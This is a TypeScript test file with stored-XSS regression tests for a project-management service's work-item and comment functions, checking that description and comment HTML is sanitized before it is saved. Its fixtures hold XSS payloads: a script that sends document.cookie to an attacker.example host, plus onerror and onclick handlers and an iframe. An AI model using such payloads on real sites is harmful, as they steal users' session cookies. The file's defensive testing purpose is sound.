import { describe, it, expect } from "vitest";
import { addComment, createWorkItem, updateWorkItem } from "./pm.service.js";
// WARP-1570: pm.service.ts declares an isolation level, so this suite inherits
// the shared seam instead of a hand-rolled $transaction stub.
import { createTransactionSeam } from "../../__tests__/helpers/prisma-tx-harness.js";

/**
 * Stored-XSS regression tests (PR #684 findings 1 & 2). These exercise the real
 * service functions against a minimal fake Prisma so the assertion is on the
 * value that actually gets persisted (`data` passed to `*.create` / `*.update`),
 * proving the sanitizer runs at the write boundary regardless of the caller
 * (dashboard API, mobile API, or MCP service principal).
 */

const XSS_DESC =
  '<p>ok</p><script>fetch("https://attacker.example/"+document.cookie)</script>' +
  '<img src="x" onerror="alert(document.cookie)"><iframe src="https://evil"></iframe>';
const XSS_COMMENT = '<img src=x onerror=alert(document.cookie)><b onclick="steal()">hi</b>';

// A minimal mapWorkItem-compatible row for the loadWorkItem read-back; state is
// null (mapWorkItem is null-safe on state) so we don't have to mock a full state.
function readBackRow(descriptionHtml: string | null) {
  return {
    id: "wi-1",
    projectId: "p1",
    sequenceId: 1,
    name: "x",
    descriptionHtml,
    priority: "none",
    stateId: null,
    cycleId: null,
    state: null,
    assignees: [],
    labels: [],
    parentId: null,
    createdById: null,
    startDate: null,
    dueDate: null,
    sortOrder: 1,
    completedAt: null,
    _count: { comments: 0, children: 0 },
    createdAt: new Date(),
    updatedAt: new Date(),
  };
}

describe("PM service sanitizes stored HTML (stored-XSS guards)", () => {
  it("createWorkItem sanitizes description_html before persisting", async () => {
    let persisted: { descriptionHtml?: string | null } | undefined;
    const tx = {
      pmProject: { update: async () => ({ seqCounter: 1 }) },
      pmWorkItem: {
        create: async ({ data }: { data: { descriptionHtml?: string | null } }) => {
          persisted = data;
          return { id: "wi-1" };
        },
      },
      pmActivity: { create: async () => ({}) },
    };
    const prisma = {
      pmProject: {
        findUnique: async () => ({
          id: "p1",
          identifier: "PRJ",
          states: [
            { id: "s1", isDefault: true, sortOrder: 1, group: "unstarted", projectId: "p1" },
          ],
        }),
      },
      pmWorkItem: { findUnique: async () => readBackRow(persisted?.descriptionHtml ?? null) },
      pmState: { findUnique: async () => null },
      pmLabel: { findMany: async () => [] },
      $transaction: createTransactionSeam({ client: () => tx }).$transaction,
    } as never;

    await createWorkItem(prisma, null, "p1", { name: "x", descriptionHtml: XSS_DESC });

    const html = persisted!.descriptionHtml as string;
    expect(html).not.toContain("<script");
    expect(html).not.toContain("onerror");
    expect(html).not.toContain("<iframe");
    expect(html).not.toContain("<img");
    expect(html).not.toContain("document.cookie");
    expect(html).toContain("<p>ok</p>");
  });

  it("updateWorkItem sanitizes description_html before persisting", async () => {
    let persisted: { descriptionHtml?: string | null } | undefined;
    const tx = {
      pmWorkItem: {
        update: async ({ data }: { data: { descriptionHtml?: string | null } }) => {
          persisted = data;
          return { id: "wi-1" };
        },
      },
      pmWorkItemAssignee: { deleteMany: async () => ({}), createMany: async () => ({}) },
      pmWorkItemLabel: { deleteMany: async () => ({}), createMany: async () => ({}) },
      pmActivity: { create: async () => ({}) },
    };
    let call = 0;
    const prisma = {
      pmWorkItem: {
        findUnique: async () => {
          call += 1;
          if (call === 1) {
            return { id: "wi-1", projectId: "p1", stateId: "s1", assignees: [], labels: [] };
          }
          return readBackRow(persisted?.descriptionHtml ?? null);
        },
      },
      pmProject: { findUnique: async () => ({ id: "p1", identifier: "PRJ" }) },
      pmState: { findUnique: async () => null },
      pmLabel: { findMany: async () => [] },
      $transaction: createTransactionSeam({ client: () => tx }).$transaction,
    } as never;

    await updateWorkItem(prisma, null, "wi-1", { descriptionHtml: XSS_DESC });

    const html = persisted!.descriptionHtml as string;
    expect(html).not.toContain("<script");
    expect(html).not.toContain("onerror");
    expect(html).not.toContain("<img");
    expect(html).toContain("<p>ok</p>");
  });

  it("updateWorkItem preserves null description (clear) without sanitizing", async () => {
    let persisted: { descriptionHtml?: string | null } | undefined;
    const tx = {
      pmWorkItem: {
        update: async ({ data }: { data: { descriptionHtml?: string | null } }) => {
          persisted = data;
          return { id: "wi-1" };
        },
      },
      pmWorkItemAssignee: { deleteMany: async () => ({}), createMany: async () => ({}) },
      pmWorkItemLabel: { deleteMany: async () => ({}), createMany: async () => ({}) },
      pmActivity: { create: async () => ({}) },
    };
    let call = 0;
    const prisma = {
      pmWorkItem: {
        findUnique: async () => {
          call += 1;
          if (call === 1) {
            return { id: "wi-1", projectId: "p1", stateId: "s1", assignees: [], labels: [] };
          }
          return readBackRow(null);
        },
      },
      pmProject: { findUnique: async () => ({ id: "p1", identifier: "PRJ" }) },
      pmState: { findUnique: async () => null },
      pmLabel: { findMany: async () => [] },
      $transaction: createTransactionSeam({ client: () => tx }).$transaction,
    } as never;

    await updateWorkItem(prisma, null, "wi-1", { descriptionHtml: null });
    expect(persisted!.descriptionHtml).toBeNull();
  });

  it("addComment sanitizes comment_html before persisting", async () => {
    let persisted: { commentHtml?: string } | undefined;
    const tx = {
      pmComment: {
        create: async ({ data }: { data: { commentHtml?: string } }) => {
          persisted = data;
          return {
            id: "c1",
            workItemId: "wi-1",
            authorId: null,
            commentHtml: data.commentHtml,
            createdAt: new Date(),
            updatedAt: new Date(),
          };
        },
      },
      pmActivity: { create: async () => ({}) },
    };
    const prisma = {
      pmWorkItem: { findUnique: async () => ({ id: "wi-1" }) },
      $transaction: createTransactionSeam({ client: () => tx }).$transaction,
    } as never;

    await addComment(prisma, null, "wi-1", XSS_COMMENT);

    const html = persisted!.commentHtml as string;
    expect(html).not.toContain("<img");
    expect(html).not.toContain("onerror");
    expect(html).not.toContain("onclick");
    expect(html).not.toContain("document.cookie");
    expect(html).toContain("hi");
  });
});
